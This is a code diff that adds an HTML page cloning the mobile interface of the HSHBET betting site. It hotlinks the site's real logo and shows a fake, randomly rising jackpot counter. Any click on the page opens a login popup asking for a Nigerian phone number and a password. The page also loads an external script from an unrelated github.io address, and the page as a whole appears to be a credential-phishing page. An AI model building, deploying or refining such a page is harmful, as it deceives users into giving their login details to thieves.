@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HSHBET UI CLONE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+
+/* ===== BACKGROUND ===== */
+body{
+  max-width:430px;
+  margin:auto;
+  min-height:100vh;
+  background:
+    linear-gradient(0deg, rgba(14,58,42,0.94), rgba(14,58,42,0.94)),
+    repeating-linear-gradient(
+      45deg,
+      #0f3f2f 0px,
+      #0f3f2f 14px,
+      #114734 14px,
+      #114734 28px
+    );
+  color:#fff;
+  padding-bottom:80px;
+}
+
+/* ===== TOP BAR ===== */
+.topbar{
+  background:#0b2f22;
+  padding:10px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+.logo{color:#ffd600;font-weight:bold}
+.topbar button{
+  background:#f3ff66;
+  border:none;
+  padding:6px 12px;
+  border-radius:6px;
+  margin-left:6px;
+  font-weight:bold;
+}
+
+/* ===== BANNER ===== */
+.banner{
+  margin:10px;
+  border-radius:12px;
+  height:140px;
+  background:linear-gradient(90deg,#ff7000,#ff2d80);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+  background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRj988tVQJSQWyRPYTqUBGUtQ5wtwFp2cyTn1S8fyoX5Ik_UpYOCpiJG-M&s=10');
+}
+
+/* ===== TABS ===== */
+.tabs{
+  display:flex;
+  justify-content:space-around;
+  padding:10px 0;
+  color:#b9d6c9;
+}
+.tabs .active{
+  color:#ffd600;
+  border-bottom:2px solid #ffd600;
+}
+
+/* ===== JACKPOT ===== */
+.jackpot{
+  background:#fff1a8;
+  color:#000;
+  margin:10px;
+  border-radius:12px;
+  padding:12px;
+  text-align:center;
+  font-weight:bold;
+}
+.jackpot span{font-size:22px}
+
+/* ===== GAMES ===== */
+.games{
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  gap:12px;
+  padding:10px;
+}
+.game-card{
+  background:#184c38;
+  border-radius:12px;
+  overflow:hidden;
+}
+.game-card .img{
+  height:120px;
+  background:#ffb703;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.game-title{text-align:center;padding:6px
+  background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRqhexe1SE_obIFuN3baA-LF0qSyHZ7PwZKNETdSh8UUexQA1mDUI-KeTQ&s=10');
+}
+
+/* ===== LOGIN OVERLAY ===== */
+.overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:999;
+}
+
+/* ===== LOGIN BOX ===== */
+.login-box{
+  width:92%;
+  background:#134b39;
+  border-radius:18px;
+  padding:14px;
+}
+
+/* ===== TABS ===== */
+.login-tabs{
+  display:flex;
+  background:#0f3f2f;
+  border-radius:12px;
+}
+.login-tabs div{
+  flex:1;
+  text-align:center;
+  padding:10px;
+  color:#ffffff;
+  font-size:14px;
+}
+.login-tabs .active{
+  background:#134b39;
+  color:#ffd600;
+  border-bottom:2px solid #ffd600;
+}
+
+/* ===== LABEL ===== */
+.label{
+  font-size:13px;
+  margin:12px 0 6px;
+  color:#ffffff;
+}
+
+/* ===== INPUT ===== */
+.input-box{
+  background:#0f3f2f;
+  border-radius:10px;
+  padding:12px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin-bottom:10px;
+  border:1px solid #1f6a53;
+}
+.input-box:focus-within{
+  border:1px solid #f3ff66;   /* ✅ SOFT YELLOW BORDER, NOT GLOW */
+}
+.input-box input{
+  flex:1;
+  background:none;
+  border:none;
+  outline:none;
+  color:white;
+  font-size:14px;
+}
+
+/* ===== REMEMBER ===== */
+.remember{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  font-size:13px;
+  color:white;
+}
+
+/* ===== LOGIN BUTTON ===== */
+.login-btn{
+  width:100%;
+  background:#f3ff66;
+  border:none;
+  border-radius:12px;
+  padding:14px;
+  margin-top:10px;
+  font-weight:bold;
+}
+
+/* ===== FOOTER ===== */
+.login-footer{
+  display:flex;
+  justify-content:space-between;
+  margin-top:12px;
+  font-size:13px;
+  color:white;
+}
+
+/* ✅ ✅ ✅ CANCEL INSIDE FORM */
+.close{
+  width:42px;
+  height:42px;
+  margin:16px auto 0;
+  border-radius:50%;
+  background:#0f3f2f;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:20px;
+  color:white;
+  border:1px solid rgba(255,255,255,0.3);
+  cursor:pointer;
+}
+
+/* ===== BOTTOM NAV ===== */
+.bottom-nav{
+  position:fixed;
+  bottom:0;
+  width:100%;
+  max-width:430px;
+  background:#0b2f22;
+  display:flex;
+  justify-content:space-around;
+  padding:8px 0;
+}
+.bottom-nav div{
+  font-size:12px;
+  color:#b9d6c9;
+}
+.bottom-nav .active{color:#ffd600}
+</style>
+</head>
+
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="topbar">
+  <div class="logo"><img src="https://otebhsh.hshbet.net/siteadmin/upload/img/1936578444132171778.avif" style="width:150px;"></div>
+  <div>
+    <button>Login</button>
+    <button>Register</button>
+  </div>
+</div>
+
+<div class="banner"></div>
+
+<div class="tabs">
+  <div class="active">🔥 Hot</div>
+  <div>🎰 Slot</div>
+  <div>⛓ Blockchain</div>
+  <div>🎣 Fishing</div>
+  <div>⚽ Sports</div>
+</div>
+
+<div class="jackpot">
+  JACKPOT <br>
+  <span id="jackpot">15,517,967.18</span>
+</div>
+
+<div class="games">
+  <div class="game-card"><div class="img"><img style="width:250px;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRne4VAwaqmiB9wkNAv6niBvhKGJ-V06NKlrVl1AUmaxEFemf18hVV9ZKh8&s=10"></div><div class="game-title"><img style="width:250px;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRqhexe1SE_obIFuN3baA-LF0qSyHZ7PwZKNETdSh8UUexQA1mDUI-KeTQ&s=10"></div></div>
+  <div class="game-card"><div class="img" ><img style="width:250px;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQrw9nQEJWRj9grXTwQN24OEbGy_Qdc6v3FnnyS0rr9tWEG0XEcEmfVuf8&s=10">Game</div><div class="game-title"><img style="width:250px;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuVyDbSiHB3FAoMqVVCg3IdNmaia4l_DECDXgGxERqhw&s">Lucky Neko</div></div>
+</div>
+
+<div class="bottom-nav">
+  <div class="active">Home</div>
+  <div>Offers</div>
+  <div>Invite</div>
+  <div>Support</div>
+</div>
+
+<!-- ✅ LOGIN POPUP -->
+<div class="overlay" id="overlay">
+  <div class="login-box">
+
+    <div class="login-tabs">
+      <div>Register</div>
+      <div class="active">Login</div>
+    </div>
+
+    <div class="label">Support Phone number/Username Login</div>
+<form>
+    <div class="input-box">
+      🇳🇬 +234
+      <input type="tel" maxlength="11" placeholder="Please enter Phone number" name="Phone number" required>
+    </div>
+
+    <div class="input-box">
+      🔒
+      <input type="password" id="passwordInput" placeholder="Enter password" name="password" required>
+      <span onclick="togglePassword()">👁</span>
+    </div>
+
+    <div class="remember">
+      <input type="checkbox" checked>
+      <span>Remember account password</span>
+    </div>
+
+    <button class="login-btn" type="submit">Login</button>
+
+    <div class="login-footer">
+      <span>Customer Service</span>
+      <span>Forgot Password</span>
+    </div>
+</form>
+    <!-- ✅ ✅ ✅ PROPER WHITE CANCEL INSIDE -->
+    <div class="close" onclick="closeLogin()">✖</div>
+
+  </div>
+</div>
+
+<script>
+/* OPEN LOGIN ANY CLICK */
+document.addEventListener("click",()=>{
+  overlay.style.display="flex";
+});
+
+/* TOGGLE PASSWORD */
+function togglePassword(){
+  var input = document.getElementById("passwordInput");
+  input.type = input.type === "password" ? "text" : "password";
+}
+
+/* CLOSE LOGIN */
+function closeLogin(){
+  event.stopPropagation();
+  overlay.style.display="none";
+}
+
+/* JACKPOT COUNT */
+setInterval(()=>{
+  let j=document.getElementById("jackpot");
+  let v=parseFloat(j.innerText.replace(/,/g,""));
+  v+=Math.floor(Math.random()*25);
+  j.innerText=v.toLocaleString();
+},1500);
+</script>
+
+</body>
+</html>
